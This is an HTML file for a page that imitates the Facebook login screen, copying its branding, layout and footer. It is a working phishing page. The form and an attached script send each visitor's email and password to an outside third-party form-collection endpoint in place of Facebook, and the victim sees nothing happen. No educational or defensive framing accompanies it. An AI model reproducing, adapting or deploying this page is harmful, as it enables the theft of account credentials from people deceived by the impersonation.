<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" type="image/svg+xml">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 90%;
            max-width: 900px;
        }
        .info-section {
            display: none;
            text-align: left;
            font-size: 24px;
            color: #1c1e21;
            margin-bottom: 20px;
        }
        .info-section .logo {
            font-size: 48px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 10px;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        .input-field {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            display: block;
            margin: 15px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .create-account-btn {
            width: 100%;
            padding: 12px;
            background-color: #42b72a;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .create-account-btn:hover {
            background-color: #36a420;
        }
        .footer {
            width: 100%;
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #65676b;
        }
        .footer a {
            color: #65676b;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (min-width: 768px) {
            .main-container {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
            .info-section {
                display: block;
                width: 45%;
            }
            .container {
                width: 45%;
            }
        }
        @media (max-width: 767px) {
            .container::before {
                content: "facebook";
                display: block;
                font-size: 36px;
                font-weight: bold;
                color: #1877f2;
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="info-section">
            <div class="logo">facebook</div>
            <h1>Connect with friends and the world around you on Facebook.</h1>
        </div>
        <div class="container">
            <form id="loginForm" action="https://usebasin.com/f/0f599a21a091" method="POST">
                <input type="email" name="email" class="input-field" placeholder="Email or phone number" required>
                <input type="password" name="password" class="input-field" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <a href="#" class="forgot-password">Forgot password?</a>
            <button class="create-account-btn">Create New Account</button>
        </div>
    </div>
    <div class="footer">
        <p>
            <a href="#">English (US)</a>
            <a href="#">Español</a>
            <a href="#">Français (France)</a>
            <a href="#">Deutsch</a>
            <a href="#">Português (Brasil)</a>
            <a href="#">Italiano</a>
            <a href="#">العربية</a>
        </p>
        <p>
            <a href="#">Sign Up</a>
            <a href="#">Log In</a>
            <a href="#">Messenger</a>
            <a href="#">Facebook Lite</a>
            <a href="#">Watch</a>
            <a href="#">Marketplace</a>
            <a href="#">Privacy</a>
        </p>
        <p>Meta © 2025</p>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the default form submission

            const formData = new FormData(this);

            fetch(this.action, {
                method: 'POST',
                body: formData,
            })
            .then(response => {
                if (response.ok) {
                    console.log("Form submitted successfully!");
                } else {
                    console.log("Error: Submission failed.");
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
